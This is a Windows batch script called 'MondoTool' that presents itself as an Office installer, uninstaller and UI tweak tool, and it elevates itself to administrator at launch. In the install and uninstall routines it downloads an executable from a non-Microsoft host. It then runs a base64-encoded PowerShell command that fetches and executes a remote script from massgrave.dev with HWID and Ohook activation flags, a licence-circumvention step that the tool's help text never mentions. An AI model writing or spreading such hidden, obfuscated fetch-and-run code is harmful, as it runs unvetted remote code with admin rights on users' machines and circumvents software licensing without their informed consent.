@echo off
title MondoTool
set "params=%*"&cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd /d ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
set Exit=0
set error=0
echo.MondoTool v1.0.0 (build 5)
echo.Created by Tech Stuff (@teknixstuff)
echo.Type "help" for more infomation
echo.
:entercmd
set "CMD="
set /p CMD=MondoTool^>
if "%CMD%"=="" goto :entercmd
call :%CMD%
set error=%ErrorLevel%
If "%Exit%"=="1" exit /b
goto :entercmd

:"Help"
echo.Remember to remove quotes!
echo.
exit /b

:Help
echo.Available Commands:
::echo.InstallMondo		- Installs Microsoft Office Mondo (Recommended)
::echo.Install356		- Installs Microsoft Office 365
echo.InstallOffice		- Installs Microsoft Office
echo.UninstallOffice		- Removes all Microsoft Office products
echo.EnableRedesign		- Enables the redesigned Office UI
echo.DisableRedesign		- Disables the redesigned Office UI
echo.EditTemplate		- Opens the blank document template
echo.ResetTemplate		- Resets the blank document template
echo.Help			- View available commands
echo.About			- View infomation about MondoTool
echo.Exit			- Exit MondoTool
echo.
exit /b

:About
start https://youtube.com/@teknixstuff
exit /b

:EditTemplate
start shell:::{2559A1F3-21D7-11D4-BDAF-00C04F60B9F0}
powershell sleep 0.5;(New-Object -ComObject WScript.Shell).SendKeys('winword """%appdata%\Microsoft\Templates\Normal.dotm"""~')
exit /b

:ResetTemplate
del /f /q "%appdata%\Microsoft\Templates\Normal.dotm"
exit /b

:cls
cls
exit /b

:geterror
echo Error %errorlevel%
exit /b

:clear
cls
exit /b

:Exit
set Exit=1
exit /b

:EnableRedesign
(
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\word" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\word" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\word" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\excel" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\excel" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\excel" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\onenote" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\onenote" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\onenote" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\outlook" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\outlook" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\outlook" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\powerpoint" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\powerpoint" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\powerpoint" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\visio" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\visio" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\visio" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\access" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\access" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\access" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\project" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\project" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "true" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\project" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "true" /f
) >nul
exit /b

:DisableRedesign
(
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\word" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\word" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\word" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\excel" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\excel" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\excel" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\onenote" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\onenote" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\onenote" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\outlook" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\outlook" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\outlook" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\powerpoint" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\powerpoint" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\powerpoint" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\visio" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\visio" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\visio" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\access" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\access" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\access" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\project" /v "Microsoft.Office.UXPlatform.FluentSVRefresh" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\project" /v "Microsoft.Office.UXPlatform.RibbonTouchOptimization" /t REG_SZ /d "false" /f
Reg.exe add "HKCU\Software\Microsoft\Office\16.0\Common\ExperimentConfigs\ExternalFeatureOverrides\project" /v "Microsoft.Office.UXPlatform.FluentSVRibbonOptionsMenu" /t REG_SZ /d "false" /f
) >nul
exit /b

:InstallOffice
:InstallMondo
echo.^<Configuration^>^<Add OfficeClientEdition="64" Channel="Current"^>^<Product ID="MondoRetail"^>^<Language ID="en-US" /^>^<ExcludeApp ID="Groove" /^>^<ExcludeApp ID="Lync" /^>^<ExcludeApp ID="OneDrive" /^>^<ExcludeApp ID="Teams" /^>^</Product^>^</Add^>^<Display Level="Full" AcceptEULA="TRUE" /^>^<Updates Enabled="TRUE" Channel="Current" /^>^</Configuration^> > "%temp%\odtcfg.xml"
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/odt.exe -OutFile "${env:temp}\odt.exe"
"%temp%\odt.exe" /configure "%temp%\odtcfg.xml"
del /f /q "%temp%\odt.exe"
del /f /q "%temp%\odtcfg.xml"
powershell -ec JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAG0AYQBzAHMAZwByAGEAdgBlAC4AZABlAHYALwBnAGUAdAApACkAKQAgAC8ASABXAEkARAAgAC8ATwBoAG8AbwBrAA==
exit /b

:Install365ProPlus
echo.^<Configuration ID="f8b192f1-1b90-4942-b9b3-7cbad83c8cf7"^>^<Add OfficeClientEdition="64" Channel="Current" MigrateArch="TRUE"^>^<Product ID="O365ProPlusEEANoTeamsRetail"^>^<Language ID="MatchOS" /^>^<Language ID="MatchPreviousMSI" /^>^<ExcludeApp ID="Groove" /^>^<ExcludeApp ID="Lync" /^>^<ExcludeApp ID="OneDrive" /^>^<ExcludeApp ID="Bing" /^>^<ExcludeApp ID="Bing" /^>^<ExcludeApp ID="Bing" /^>^</Product^>^<Product ID="VisioProRetail"^>^<Language ID="MatchOS" /^>^<Language ID="MatchPreviousMSI" /^>^<ExcludeApp ID="Groove" /^>^<ExcludeApp ID="Lync" /^>^<ExcludeApp ID="OneDrive" /^>^<ExcludeApp ID="Bing" /^>^<ExcludeApp ID="Bing" /^>^<ExcludeApp ID="Bing" /^>^</Product^>^<Product ID="ProjectProRetail"^>^<Language ID="MatchOS" /^>^<Language ID="MatchPreviousMSI" /^>^<ExcludeApp ID="Groove" /^>^<ExcludeApp ID="Lync" /^>^<ExcludeApp ID="OneDrive" /^>^<ExcludeApp ID="Bing" /^>^<ExcludeApp ID="Bing" /^>^<ExcludeApp ID="Bing" /^>^</Product^>^<Product ID="AccessRuntimeRetail"^>^<Language ID="MatchOS" /^>^<Language ID="MatchPreviousMSI" /^>^<ExcludeApp ID="Bing" /^>^</Product^>^</Add^>^<Property Name="SharedComputerLicensing" Value="0" /^>^<Property Name="FORCEAPPSHUTDOWN" Value="TRUE" /^>^<Property Name="DeviceBasedLicensing" Value="0" /^>^<Property Name="SCLCacheOverride" Value="0" /^>^<Updates Enabled="TRUE" /^>^<RemoveMSI /^>^<AppSettings^>^<User Key="software\microsoft\office\16.0\excel\options" Name="defaultformat" Value="51" Type="REG_DWORD" App="excel16" Id="L_SaveExcelfilesas" /^>^<User Key="software\microsoft\office\16.0\powerpoint\options" Name="defaultformat" Value="27" Type="REG_DWORD" App="ppt16" Id="L_SavePowerPointfilesas" /^>^<User Key="software\microsoft\office\16.0\word\options" Name="defaultformat" Value="" Type="REG_SZ" App="word16" Id="L_SaveWordfilesas" /^>^</AppSettings^>^<Display Level="Full" AcceptEULA="TRUE" /^>^</Configuration^> > "%temp%\odtcfg.xml"
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/odt.exe -OutFile "${env:temp}\odt.exe"
"%temp%\odt.exe" /configure "%temp%\odtcfg.xml"
del /f /q "%temp%\odt.exe"
del /f /q "%temp%\odtcfg.xml"
powershell -ec JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAG0AYQBzAHMAZwByAGEAdgBlAC4AZABlAHYALwBnAGUAdAApACkAKQAgAC8ASABXAEkARAAgAC8ATwBoAG8AbwBrAA==
exit /b

:UninstallOffice
echo.^<Configuration^>^<Remove All="TRUE"^>^</Remove^>^</Configuration^> > "%temp%\odtcfg.xml"
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/odt.exe -OutFile "${env:temp}\odt.exe"
"%temp%\odt.exe" /configure "%temp%\odtcfg.xml"
del /f /q "%temp%\odt.exe"
del /f /q "%temp%\odtcfg.xml"
powershell -ec JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAG0AYQBzAHMAZwByAGEAdgBlAC4AZABlAHYALwBnAGUAdAApACkAKQAgAC8ASABXAEkARAAgAC8ATwBoAG8AbwBrAA==
exit /b
